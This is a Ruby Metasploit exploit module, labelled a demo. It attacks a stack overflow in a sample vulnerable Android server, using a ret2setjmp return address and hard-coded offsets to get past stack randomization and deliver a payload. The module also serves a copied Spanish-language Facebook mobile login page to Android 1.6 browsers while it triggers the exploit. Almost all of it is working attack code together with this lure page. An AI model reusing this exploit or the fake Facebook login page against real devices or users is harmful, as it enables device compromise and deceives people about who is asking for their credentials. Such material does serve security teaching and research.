#
#
# Custom metasploit exploit for sample vuln app Android
# Written by Eloi Sanfelix
#
# Converted to Msf::Exploit::Remote::HttpServer::HTML by TB·Security
# for demo usage
#
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::Tcp
      
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'Custom vulnerable server stack overflow for Android',
            'Description'    => %q{
                            This module exploits a stack overflow in a
                            custom vulnerable server for Android. Uses a 
                            ret2setjmp technique to bypass stack randomization.
                                 },
            'Author'         => [ 'esanfelix' , 'vierito5' ],
            'Version'        => '$Revision: 1.0 $',
            'Platform'       => 'linux',
            'Arch'		=> ARCH_ARMLE,
            'Targets'        =>
                    [
                        ['Android <= 2.0',
                              { 'Ret' => 0xafe0ddf0, 
                                'Offset' => 88 , 
                                'Dest' => 0xb0014004, 
                                'RegOffset' => 56 },
                        ]
                    ],
            'DefaultTarget' => 0,
            'Privileged'     => false
        ))

        register_options(
        [
                Opt::RPORT(2000), Opt::RHOST("127.0.0.1")
        ], self.class)
    end

    def exploit_eloi_app
        connect
        repeat = target['Offset']/4
        junk = make_nops(target['Offset']-16) + "\x1d\xff\x2f\xe1"*4 
        nops = make_nops(40*4) # NOPs to avoid payload destruction by vuln app
        sploit = junk + [target.ret].pack('V') + [target['Dest']].pack('V') + [target['Dest'] + target['RegOffset']].pack('V') +nops +payload.encoded
        real_sploit = [sploit.length()].pack('V') + sploit
        sock.put(real_sploit)
        disconnect
        handler
    end
       
    def on_request_uri(cli, request)
		html = %Q|<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN">
<html>
<head>
</head>
<body>
    Page out of service
</body>
</html>|

        html_facebook=%Q`
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml"><head><title>¡Bienvenido a Facebook! | Facebook</title><meta name="description" content="Facebook helps you connect and share with the people in your life." /><style type="text/css">div.results{padding:3px;background:#f7f7f7} div.wall{padding:3px;border:solid 1px #ccc;background:#fff} table.results{border:solid 1px #ccc;border-top:none} table.results td{background:#fff;border-top:solid 1px #ccc;padding:3px} table.results tr.emphasis td{background:#eceff5}.acw{background-color:#fff} .acbk{background-color:#000} .acb{background-color:#3b5998} .aclb{background-color:#eceff5} .acg{background-color:#f2f2f2} .acy{background-color:#fffbe2} .acr{background-color:#ffebe8}.touch .aps{padding:2px 8px} .touch .apm{padding:5px 8px} .touch .apl{padding:8px 8px}.fcb{color:#000} .fcg{color:#808080} .fcw{color:#fff}.touch .mfsxs{font-size:10px;line-height:12px} .touch .mfss{font-size:12px;line-height:14px} .touch .mfsm{font-size:14px;line-height:17px} .touch .mfsl{font-size:16px;line-height:18px}body{margin:0;padding:0} body, tr, input, textarea{font-family:sans-serif;font-size:medium}body.touch, .touch tr, .touch input, .touch textarea{font-family:Helvetica, sans-serif;font-size:14px} #root{width:100%;overflow-x:hidden} *{-webkit-touch-callout:none;-webkit-tap-highlight-color:rgba(0,0,0,0);-webkit-text-size-adjust:none;-webkit-user-select:none} input, textarea, button{-webkit-user-select:auto}#fb_header{height:24px} form{margin:0;border:0} .pad{padding:2px 3px} small{color:#555} img.p{border:1px solid #ccc} #fb_header table{border-spacing:0;width:100%} .marquee{padding-bottom:1px} .marquee a{padding:2px 4px 2px} .marquee_tab_select{color:#fff;background-color:#6d84b4} .wall{margin-bottom:2px} #title, .section_title{font-weight:bold;color:#333} .button{background-color:#3b5998;color:#fff} .inline_button{vertical-align:top;padding:1px 6px 1px;margin-left:5px} .green_button{background-color:#69a74e;color:#fff} .default_button{background-color:#eee;color:#000} .likebox, .comment{border-bottom:1px solid #fff !important} .recent_activity{padding-left:8px} .dh{padding-top:3px} .note{background-color:#f7f7f7;border-top:1px solid #3b5998;border-bottom:1px solid #ccc} .likethumbicon{margin-right:3px;vertical-align:baseline} .icon{vertical-align:top;margin:0 2px} .page-nav .selected{font-weight:bold} ul{margin:0;padding-left:20px}a.sub, a.sub:visited{color:#808080} a.inv, a.inv:visited{color:#fff} a.inv:focus, a.inv:hover{color:#3b5998;background-color:#fff} a, a:visited{color:#3b5998;text-decoration:none} a:focus, a:hover{color:#fff;background-color:#3b5998}.touch a:focus, a.touchable_block, a.touchable_block:visited, a.touchable_block:hover, a.touchable_inline, a.touchable_inline:visited, a.touchable_inline:hover{color:inherit;background-color:transparent}</style><meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;" /></head><body class="touch" orient="portrait"><script type="text/javascript">/* <![CDATA[ */ (function(){var scrollY=1;function identifyOrientation(){var wasLandscape=document.body.getAttribute("orient")=="landscape";var isLandscape="orientation"in window&&Math.abs(window.orientation)==90||window.innerWidth>window.innerHeight;if(isLandscape===wasLandscape){return;} document.body.setAttribute("orient",isLandscape?"landscape":"portrait");window.scrollTo(0,scrollY);} function resetScroll(){document.removeEventListener("DOMContentLoaded",resetScroll);window.removeEventListener("load",resetScroll);setTimeout(function(){window.scrollTo(0,scrollY);},0);} window.addEventListener("onorientationchange"in window?"orientationchange":"resize",identifyOrientation);document.addEventListener("DOMContentLoaded",resetScroll);window.addEventListener("load",resetScroll);window.addEventListener("scroll",function(){scrollY=window.pageYOffset;});identifyOrientation();}()); /* ]]> */</script><div class="mfsm" id="root"><div class="acb" id="fb_header"><table width="100%"><tr><td class="header_logo"><img class="img" src="http://static.ak.fbcdn.net/rsrc.php/z3/r/Y9UK9oZ-PyH.png" width="79" height="22" id="facebook_logo" alt="Facebook" /></td></tr></table></div><div class="acw apm" id="title"><strong>¡Bienvenido a Facebook!</strong></div><div id="body"><div class="acw apm"><div>Facebook te ayuda a comunicarte y compartir tu vida con las personas que conoces.<div class="abt acw"></div></div><form action="https://login.facebook.com/login.php?m=m&amp;refsrc=http%3A%2F%2Fm.facebook.com%2F&amp;fbb=r01efb644&amp;refid=8" method="post"><input type="hidden" name="charset_test" value="€,´,€,´,水,Д,Є" /><input type="hidden" name="lsd" value="eF8SC" autocomplete="off" /><span class="mfss fcg">Dirección de correo electrónico o número de teléfono:</span><br /><input type="text" name="email" value="" /><br /><span class="mfss fcg">Contraseña:</span><br /><input type="password" name="pass" /><br /><div><input type="submit" class="button" name="login" value="Entrar" /></div></form><span class="mfss fcg"><a href="http://m.facebook.com/reset.php?fbb=r01efb644&amp;refid=8">¿Has olvidado tu contraseña?</a></span></div><div class="acw apm">¿Tienes problemas para entrar en Facebook? <a href="http://m.facebook.com/login.php?http&amp;refsrc=http%3A%2F%2Fm.facebook.com%2F&amp;no_next_msg&amp;fbb=r01efb644&amp;refid=8">Prueba con inicio de sesión alternativo.</a></div><div class="acw apm">¿Necesitas una cuenta de Facebook? <a href="http://m.facebook.com/r.php?fbb=r01efb644&amp;refid=8">Regístrate aquí</a>.</div></div><div id="footer"><div class="acw apm"><span class="mfss fcg"><b>Español (España)</b> · <a href="http://m.facebook.com/a/language.php?l=ca_ES&amp;gfid=1b59052d66&amp;fbb=r01efb644&amp;refid=8">Català</a> · <a href="http://m.facebook.com/language.php?fbb=r01efb644&amp;refid=8">Más…</a></span></div><div class="acw apm"><a href="market://details?id=com.facebook.katana">Descargar</a> Facebook para tu HTC Sappire.<br /><br /><span class="mfss fcg">Facebook ©2010 · <a href="http://touch.facebook.com/?fbb=r01efb644&amp;refid=8">sitio táctil</a></span></div></div><script type="text/javascript">/* <![CDATA[ */if (top != self) { try { if (parent != top) { throw 1; } var disallowed = ["apps.facebook.com","\/pages\/"]; href = top.location.href.toLowerCase(); for (var i = 0; i < disallowed.length; i++) { if (href.indexOf(disallowed[i]) >= 0) { throw 1; } } } catch (e) {setTimeout(function() {var fb_cj_img = new Image(); fb_cj_img.src = "http:\/\/error.facebook.com\/common\/scribe_endpoint.php?c=si_clickjacking&m&t=2942";}, 5000); window.document.write("<style>body * { display:none !important; }<\/style><a href="http://m.facebook.com/%5C%22#\"" onclick=\"top.location.href=window.location.href\" style=\"display: block !important; padding: 10px\"><img class=\"img\" src="http://m.facebook.com/%5C%22http:%5C/%5C/static.ak.fbcdn.net%5C/rsrc.php%5C/zZ%5C/r%5C/mR5CDCPXQU4.gif%5C%22" style=\"display:block !important\" width=\"190\" height=\"90\" \/>Ir a Facebook.com<\/a>");/* ieB2tmw0 */ }}/* ]]> */</script></div></body></html>
`
=begin
        print_status("cli class: #{cli.class.to_s}")
        print_status("request class: #{request.class.to_s}")
        print_status("headers size: #{request.headers.size.to_s}")
        print_status("user-agent: #{request.headers['User-Agent']}")
=end
		print_status("Sending #{self.name} to client #{cli.peerhost}")
		# Transmit the compressed response to the client
        if /Android 1.6/.match(request.headers['User-Agent'])
        # Vulnerable
            send_response(cli, html_facebook, { 'Content-Type' => 'text/html; charset=utf-8', 'Pragma' => 'no-cache' })
            # ugly, only for demo
            # register_options([Opt::RHOST(cli.peerhost)], self.class)
            register_options([Opt::RHOST("127.0.0.1")], self.class)
            exploit_eloi_app
        else
        # Not Vulnerable
            send_response(cli, html, { 'Content-Type' => 'text/html; charset=utf-8', 'Pragma' => 'no-cache' })
        end
    end

end
